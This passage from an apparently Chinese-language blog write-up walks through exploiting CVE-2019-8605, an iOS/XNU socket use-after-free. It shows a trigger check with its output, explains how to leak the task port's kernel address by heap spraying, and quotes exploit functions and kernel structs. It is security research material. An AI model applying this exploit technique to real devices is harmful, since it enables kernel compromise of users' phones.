class=&quot;n&quot;&gt;minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[-] setsockopt() failed, error %d (%s)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strerror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;get_minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;NSLog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UIApplicationMain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;appDelegateClassName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;相当成功&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2021-01-20 00:26:04.136672+0800 CVE-2019-8605-iOS[650:238743] 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;4-泄露task-port内核态地址&quot;&gt;4. 泄露Task Port内核态地址&lt;/h2&gt;

&lt;p&gt;UAF漏洞常规利用方案是堆喷分配到先前释放掉的空间，这样我们拥有的指针指向的空间数据就可控，接下来尝试泄露一个地址&lt;/p&gt;

&lt;p&gt;按照Ned Williamson的思路来分析利用方案，以下的分析顺序并非按照Exp的顺序进行，大家可自行对照&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/attachment?aid=403533&amp;amp;signed_aid=-2cO9Y7SDzmQNv1CHt6J3w==&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;那么我们泄露什么地址呢？&lt;/p&gt;

&lt;p&gt;答案是：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task Port&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;为了解释说明什么是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task Port&lt;/code&gt;以及获取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task Port&lt;/code&gt;能干什么，这里先介绍XNU的Task&lt;/p&gt;

&lt;p&gt;Task是资源的容器，封装了虚拟地址空间，处理器资源，调度控制等，对应的结构体如下，重点注意其中的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPC structures&lt;/code&gt;部分&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;cm&quot;&gt;/* Synchronization/destruction information */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;decl_lck_mtx_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Task's lock */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;_Atomic&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ref_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Number of references to me */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;boolean_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Task has not been terminated */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;boolean_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;halting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Task is being halted */&lt;/span&gt;
	&lt;span class=&quot;cm&quot;&gt;/* Virtual timers */&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;vtimers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* Miscellaneous */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;vm_map_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Address space description */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;queue_chain_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;tasks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* global list of tasks */&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* Threads in this task */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;queue_head_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;threads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* IPC structures */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;decl_lck_mtx_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itk_lock_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itk_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* not a right, doesn't hold ref */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itk_nself&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* not a right, doesn't hold ref */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itk_sself&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* a send right */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exception_action&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exc_actions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXC_TYPES_COUNT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
		 			&lt;span class=&quot;cm&quot;&gt;/* a send right each valid element  */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itk_host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* a send right */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itk_bootstrap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* a send right */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itk_seatbelt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* a send right */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itk_gssd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* yet another send right */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itk_debug_control&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* send right for debugmode communications */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itk_task_access&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* and another send right */&lt;/span&gt; 
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itk_resume&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* a receive right to resume this task */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itk_registered&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TASK_PORT_REGISTER_MAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
					&lt;span class=&quot;cm&quot;&gt;/* all send rights */&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_space&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itk_space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;简单来说，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task Port&lt;/code&gt;是任务本身的Port，使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_task_self&lt;/code&gt;或&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_task_self()&lt;/code&gt;都可以获取到它，我可以利用它做很多事情，下面利用代码中的函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find_port_via_uaf()&lt;/code&gt;第一个参数就是通过调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_task_self()&lt;/code&gt;获取的&lt;/p&gt;

&lt;p&gt;泄露&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task Port&lt;/code&gt;的流程如下&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;self_port_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_self_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// port leak primitive&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里还用到了缓存机制&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;task_self_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cached_task_self_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 判断是否获取过Task Port地址&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cached_task_self_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cached_task_self_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// 返回缓存的Task Port地址&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find_port_via_uaf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_COPY_SEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;先获取一个存在漏洞的Socket，然后填充释放掉的内存并利用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inp-&amp;gt;in6p_outputopts&lt;/code&gt;读取数据&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;find_port_via_uaf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_socket_with_dangling_options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// 填充释放掉的内存并利用inp-&amp;gt;in6p_outputopts读取数据&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;这里不直接填充数据是因为Port在用户态和内核态表现形式不一样，我们不能盲目直接把Port填充进去&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;在用户态，Port是一个无符号整形&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__darwin_mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__darwin_mach_port_name_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__darwin_mach_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Used by mach */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__darwin_natural_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__darwin_mach_port_name_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Used by mach */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;__darwin_natural_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在内核态，Port可是一个结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_port&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/*
	 * Initial sub-structure in common with ipc_pset
	 * First element is an ipc_object second is a
	 * message queue
	 */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_mqueue&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_space&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;receiver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ipc_port_timestamp_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ipc_kobject_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ipc_importance_task_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imp_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sync_inheritor_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;knote&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sync_inheritor_knote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;turnstile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sync_inheritor_ts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_nsrequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_pdrequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port_request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;premsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;turnstile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send_turnstile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;SLIST_ENTRY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dealloc_elm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kdata2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;natural_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_sprequests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* send-possible requests outstanding */&lt;/span&gt;
		  &lt;span class=&quot;nl&quot;&gt;ip_spimportant:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* ... at least one is importance donating */&lt;/span&gt;
